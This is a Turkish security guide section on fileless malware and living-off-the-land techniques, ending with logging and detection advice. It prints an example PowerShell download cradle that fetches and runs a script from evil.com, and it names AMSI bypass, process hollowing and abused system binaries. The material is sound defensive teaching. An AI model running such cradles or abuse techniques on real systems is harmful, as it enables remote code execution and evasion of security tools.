---
title: "Dosyasız Zararlı Yazılımlar (Fileless Malware) ve Bellek İçi Saldırılar (Living off the Land)"
sidebar:
  order: 3
---

# Dosyasız Zararlı Yazılımlar (Fileless Malware) ve Bellek İçi Saldırılar (Living off the Land)

Geleneksel antivirüs çözümleri zararlı dosyaları disk üzerinde tarayarak tespit eder. Dosyasız saldırılar bu tespiti tamamen atlatır: kod yalnızca RAM'de yaşar, meşru sistem araçlarını kötüye kullanır ve disk üzerinde iz bırakmaz. Bu saldırı kategorisi günümüzde APT gruplarının ve fidye yazılımı operatörlerinin birincil tekniği haline gelmiştir.

## §7.3.1. Dosyasız Saldırı Vektörleri (PowerShell, WMI, .NET)

### PowerShell Tabanlı Saldırılar
PowerShell, yönetici araçlarının en güçlüsüdür ve aynı zamanda en çok istismar edilenidir.

*   **Download Cradle:** Saldırgan, disk yazmadan doğrudan bellekte kod yürütür.
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
    ```
*   **Encoded Commands:** `-EncodedCommand` parametresiyle Base64 kodlu payload SIEM/log analizini zorlaştırır.
*   **AMSI Bypass:** Windows Antimalware Scan Interface (AMSI) yamasıyla script taraması devre dışı bırakılmaya çalışılır.

### WMI (Windows Management Instrumentation) Kalıcılığı
WMI, sistem yönetimi için tasarlanmış meşru bir Windows alt sistemidir. Saldırganlar bu altyapıyı şu amaçlarla kullanır:
*   **Kalıcılık (Persistence):** `__EventFilter`, `__EventConsumer` ve `__FilterToConsumerBinding` WMI abonelikleri disk yazmadan sistem başlangıcında kod çalıştırmayı sağlar.
*   **Lateral Movement:** WMI üzerinden uzak sistemlerde komut yürütme (`Invoke-WmiMethod`).
*   **Log Temizleme:** WMI'dan olaylar temizlenebilir; bu durum adli bilişim analizini zorlaştırır.

### .NET ve Reflective Loading
*   .NET Assembly'leri disk yazılmaksızın doğrudan belleğe yüklenir (`Assembly.Load(byte[])`).
*   **Reflective DLL Injection:** Meşru bir işlem (örn: `explorer.exe`) belleğine zararlı DLL enjekte edilir.
*   **Process Hollowing:** Meşru bir süreç başlatılır, içeriği boşaltılır ve yerine zararlı kod yazılır.

---

## §7.3.2. LOLBAS Konsepti ve Log Korelasyonu ile Savunma

### LOLBAS (Living Off The Land Binaries and Scripts)

LOLBAS, Windows ve Linux'ta yerleşik olarak gelen meşru sistem araçlarının saldırı amacıyla kötüye kullanılmasını inceler. Bu araçlar imzalı, güvenilen ve genellikle beyaz listede yer alır.

**Sık Kötüye Kullanılan Windows İkilileri:**

| İkili | Normal Kullanım | Saldırı Amaçlı Kullanım |
|---|---|---|
| `certutil.exe` | Sertifika yönetimi | Dosya indirme, Base64 çözme |
| `regsvr32.exe` | DLL kaydı | COM scriptlet yürütme (Squiblydoo) |
| `mshta.exe` | HTA dosya çalıştırma | Uzak HTA ile code execution |
| `rundll32.exe` | DLL fonksiyon çağrısı | Zararlı DLL yükleme |
| `wscript.exe` / `cscript.exe` | Script çalıştırma | VBScript/JScript payload |

**Linux/macOS LOLBAS Örnekleri:** `curl`, `wget`, `python`, `perl`, `bash -c`, `nc` (Netcat).

### Savunma: Log Korelasyonu ve Tespit Stratejileri

*   **PowerShell Loglama:** Script Block Logging (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell`) ve Module Logging etkinleştirilmeli, loglar SIEM'e gönderilmelidir.
*   **WMI Activity Logging:** `Microsoft-Windows-WMI-Activity/Operational` event log kanalı ve Security Event 4688 (process creation) izlenmelidir.
*   **Sysmon Dağıtımı:** Process creation (Event ID 1), network connection (Event ID 3), process injection (Event ID 8, 10) ile tam süreç ağacı kaydı yapılır.
*   **AMSI Zorunluluğu:** Script Block Logging ile AMSI entegrasyonu tüm PowerShell çalıştırma ortamlarında aktif olmalıdır.
*   **EDR Davranışsal Kurallar:** `certutil.exe` ve `mshta.exe` gibi araçların ağa erişim girişimleri anında alarm üretecek şekilde EDR politikasına eklenmelidir.

> [!TIP]
> LOLBAS saldırılarını tespit için [lolbas-project.github.io](https://lolbas-project.github.io) ve Sigma kuralları kütüphanesi (SigmaHQ) temel başvuru kaynaklarıdır.
